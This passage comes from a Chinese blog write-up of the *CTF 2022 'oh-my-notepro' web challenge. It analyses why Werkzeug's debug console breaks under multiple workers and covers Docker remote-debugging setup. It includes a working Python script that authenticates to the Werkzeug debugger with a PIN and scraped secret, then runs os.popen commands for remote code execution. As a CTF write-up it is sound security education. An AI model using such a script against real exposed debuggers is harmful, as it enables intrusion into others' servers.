+    <span class="token keyword">print</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
+    result <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"multi"</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+    db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    
+    result <span class="token operator">=</span> result<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">'title'</span><span class="token punctuation">:</span> result<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token string">'text'</span><span class="token punctuation">:</span> result<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'note.html'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+</code></pre>
+<p>得到了更为魔幻的结果</p>
+<p><img src="/images/%E6%98%9FCTFwp/image-20220419212915761.png" alt="image-20220419212915761"></p>
+<p>解决第一个小问题</p>
+<h3 id="debug-console同样失效"><a href="#debug-console同样失效" class="headerlink" title="debug console同样失效"></a>debug console同样失效</h3><p>如果说在debug页面失效是因为需要对应的frame还原上下文环境，werkzeug还提供了一个专门的console路由独立的执行命令，而该路由在执行时会疯狂会写404 not found，也给我整的很无语（偶尔能用，成功率相较debug页面高很多，我当初先乱按了两下命令执行成功了，然后准备读flag的时候就疯狂404了。。。）</p>
+<p>先看看执行console路由发生什么，首先在call中直接进display_console，该函数中将self.frame[0]进行了赋值，为<code>_ConsoleFrame</code>，然后在console界面输入命令会发送一个frm值为0的请求</p>
+<p>（本地按了几次都没失败，差点以为复现不了了，然后关了重开一个tab请求时app的frame就是空的了。。。）<br>还是在相同的call函数中，由于frame为空又进入到debug_application进行正常请求的处理，而这次请求的路由是<code>/console</code>，由于题目没有定义console路由，所以就究极404了</p>
+<p>至此，多进程下werkzeug的debug失效问题完全得到解答</p>
+<h3 id="多进程下使用debug执行命令"><a href="#多进程下使用debug执行命令" class="headerlink" title="多进程下使用debug执行命令"></a>多进程下使用debug执行命令</h3><p>既然如此，难道多进程就不能执行命令了吗。（当然可以，不然这个题大家怎么做出来的呢？）比如碰运气，使得两次访问都在同一个worker进程下不就成功了吗？</p>
+<p>当然，WJH师傅也提出了一个更为稳定的方案，只要保持tcp链接不断开，就能保持会话是同一个worker进行。<br>使用python requests的session即可<br>debug页面实际上是前后端分离的，幸好关键内容一开始就有，而不是后来渲染出来的。发出去的请求通过抓包和分析后端均可得出，因此可以写一个简单的脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> re
+
+
+url <span class="token operator">=</span> <span class="token string">"http://www.z3ratu1.cn:5002/"</span>
+pin <span class="token operator">=</span> <span class="token string">"916-092-422"</span>
+cmd <span class="token operator">=</span> <span class="token string">"import os;os.popen('/readflag').read()"</span>
+
+session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login"</span><span class="token punctuation">)</span>
+csrf_token <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="([a-zA-Z0-9.\\-_])+?">'</span><span class="token punctuation">,</span>
+                       res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"login"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"z33"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">,</span> <span class="token string">"csrf_token"</span><span class="token punctuation">:</span> csrf_token<span class="token punctuation">,</span> <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"login!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"view"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"note_id"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+frame <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'&lt;div class="frame" id="frame-([0-9]+?)">'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+s <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'SECRET = "([A-Za-z0-9]+?)";'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"view"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"__debugger__"</span><span class="token punctuation">:</span> <span class="token string">"yes"</span><span class="token punctuation">,</span> <span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">"pinauth"</span><span class="token punctuation">,</span> <span class="token string">"pin"</span><span class="token punctuation">:</span> pin<span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">:</span> s<span class="token punctuation">}</span><span class="token punctuation">)</span>
+res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"view"</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"__debugger__"</span><span class="token punctuation">:</span> <span class="token string">"yes"</span><span class="token punctuation">,</span> <span class="token string">"cmd"</span><span class="token punctuation">:</span> cmd<span class="token punctuation">,</span> <span class="token string">"frm"</span><span class="token punctuation">:</span> frame<span class="token punctuation">,</span> <span class="token string">"s"</span><span class="token punctuation">:</span> s<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+</code></pre>
+<p>frameid的值可以简单的抓包之后靠猜，也可以翻一下debugger.js，里面有写<code>const frameID = frames[i].id.substring(6);</code></p>
+<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>主要是搭环境。。。以前没试着调docker里的远程，这回试了一下</p>
+<h4 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h4><p>由于这个环境还有一个mysql，手搭有点麻烦，就着docker直接远程调<br>然后docker远程调试没怎么用过，照着网上的教程稍微搭一下<br>首先docker里面也得开一个ssh服务。并且原先的dockerfile中是直接把代码部署好并运行的，这里需要我们连上去之后再上传代码运行，所以需要简单的魔改一下dockerfile<br>大概就是加这些东西，然后把原来运行python的命令删掉（不删抢端口，否则好像跑两个也无所谓）</p>
+<pre class=" language-dockerfile"><code class="language-dockerfile">RUN apt-get install -y openssh-server openssh-client \
+    && echo root:complex_password | chpasswd \
+    && echo "PermitRootLogin yes" >> /etc/ssh/sshd_config \
+    && mkdir /run/sshd
+
+CMD ["/usr/sbin/sshd", "-D"]
+</code></pre>
+<p>主要的坑是这里怎么启动sshd，手动exec进去还是不怎么行，感到不适，以及需要手动创建一个<code>/run/sshd</code>目录<br>一开始想用systemctl，结果docker里面是没得systemctl的。。。这个和docker的具体实现有关，还挺复杂的。。。（坑待填）<br>然后百度的结果是用service命令或者init.d启动，但是docker必须有一个前台进程在跑，跑完docker也就退了，而上述方法启动就会导致docker在启动完成后直接退出。。。可以非常不优雅的加tail或者sleep等命令完成，但是感觉还是很愚蠢。。。<br>然后rmb神仙和我说你直接启动sshd不就完了。因为我的智力条件你也知道.jpg。期间搜到了一个不相干但确实学到了点其他知识的文章<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">CMD 容器启动命令</a></p>
+<p>ssh服务正常连上去按照网上教程走即可</p>
+<h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p>。。。这个真的是纯傻逼问题。。。<br>就是以前调试的时候，在断点停下来之后就不知道怎么让他继续运行了，只能疯狂step out之类的跳出，或者找到最外层代码直接运行到光标处。。。我一直觉得应该有一个让他直接继续运行的功能，但是今天才发现。。。除了上方的一排step键，左边的几个键也是有作用的，其中一个就是continue。。。</p>
+<p><img src="/images/%E6%98%9FCTFwp/image-20220419220911233.png" alt="image-20220419220911233"></p>
+<h4 id="调试坑"><a href="#调试坑" class="headerlink" title="调试坑"></a>调试坑</h4><p>虽然提到了在call函数中会调用response对应的函数，但直接调试时在最后一句step into却会直接返回到上一层。但是如果按continue的话又会进debug_application。这里是因为debug_application中使用了yield关键字，使其成为了一个生成器，异步操作，所以直接step into是进不去的。<br>关于python生成器也不是很熟。坑待填</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%5BCVE-2022-22965%5DSpringRCE%E5%A4%8D%E7%8E%B0.html" rel="prev" title="[CVE-2022-22965]SpringRCE分析">
+      <i class="fa fa-chevron-left"></i> [CVE-2022-22965]SpringRCE分析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF2022-web-wp"><span class="nav-number">1.</span> <span class="nav-text">[*CTF2022]web wp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#oh-my-grafana"><span class="nav-number">1.1.</span> <span class="nav-text">oh-my-grafana</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oh-my-lotto-amp-revenge"><span class="nav-number">1.2.</span> <span class="nav-text">oh-my-lotto &amp; revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oh-my-notepro"><span class="nav-number">1.3.</span> <span class="nav-text">oh-my-notepro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">1.3.1.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#debug-console%E5%90%8C%E6%A0%B7%E5%A4%B1%E6%95%88"><span class="nav-number">1.3.2.</span> <span class="nav-text">debug console同样失效</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E8%BF%9B%E7%A8%8B%E4%B8%8B%E4%BD%BF%E7%94%A8debug%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.3.3.</span> <span class="nav-text">多进程下使用debug执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91"><span class="nav-number">1.3.4.</span> <span class="nav-text">坑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">调试环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#continue"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">continue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%9D%91"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">调试坑</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
+  <p class="site-author-name" itemprop="name">Z3ratu1</p>
+  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">154</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
+      <img src="/./images/beian.png" style="display: inline-block;">
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
+      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
